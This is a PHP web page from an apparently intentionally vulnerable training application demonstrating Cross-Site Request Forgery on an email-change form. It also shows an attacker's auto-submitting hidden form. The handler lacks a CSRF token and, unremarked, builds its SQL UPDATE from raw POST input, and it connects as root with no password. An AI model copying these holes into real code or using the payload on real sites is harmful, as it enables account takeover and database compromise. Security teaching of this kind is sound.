<?php
session_start();
$conn = new mysqli('localhost', 'root', '', 'vulnerable_ecommerce');

// Fake session for demonstration
if (!isset($_SESSION['user_id'])) {
    $_SESSION['user_id'] = 1;
    $_SESSION['username'] = "victim_user";
}

// Update email if form submitted
$message = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['email'])) {
    $new_email = $_POST['email'];
    $conn->query("UPDATE users SET email='$new_email' WHERE id=" . $_SESSION['user_id']);
    $message = "<div class='alert alert-success'>Email updated successfully to: <b>" . htmlspecialchars($new_email) . "</b></div>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Vulnerability</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            padding: 20px;
        }
        .container {
            max-width: 700px;
            margin: auto;
        }
        .card {
            border: none;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .alert {
            margin-top: 20px;
        }
        h1, h5 {
            text-align: center;
        }
    </style>
</head>
<body>
<div class="container mt-5">
    <div class="card p-4">
        <h1 class="mb-4 text-primary">CSRF Vulnerability</h1>
        <p>
            This page demonstrates a **Cross-Site Request Forgery (CSRF)** vulnerability.
            An attacker can trick a logged-in user into unknowingly submitting an unintended request.
        </p>

        <h5 class="mt-4">Change Email Form</h5>
        <form method="POST">
            <div class="mb-3">
                <label for="email" class="form-label">New Email Address</label>
                <input type="email" name="email" id="email" class="form-control" placeholder="Enter your new email" required>
            </div>
            <button type="submit" class="btn btn-warning w-100">Update Email</button>
        </form>

        <?php if ($message) echo $message; ?>
    </div>

    <div class="alert alert-info mt-4">
        <strong>How it works:</strong> There is no **CSRF token** to verify the legitimacy of the request.
        This allows an attacker to craft a fake form or request that submits data on behalf of the user.
    </div>

    <div class="card mt-4 p-3">
        <h5>Example of Attacker's Page</h5>
        <p>
            An attacker could use the following hidden form on another page to exploit this vulnerability:
        </p>
        <pre class="bg-light p-3 border">
&lt;form method="POST" action="http://your-website/vuln_csrf.php"&gt;
    &lt;input type="hidden" name="email" value="attacker@example.com"&gt;
    &lt;script&gt;document.forms[0].submit();&lt;/script&gt;
&lt;/form&gt;
        </pre>
    </div>
</div>
</body>
</html>
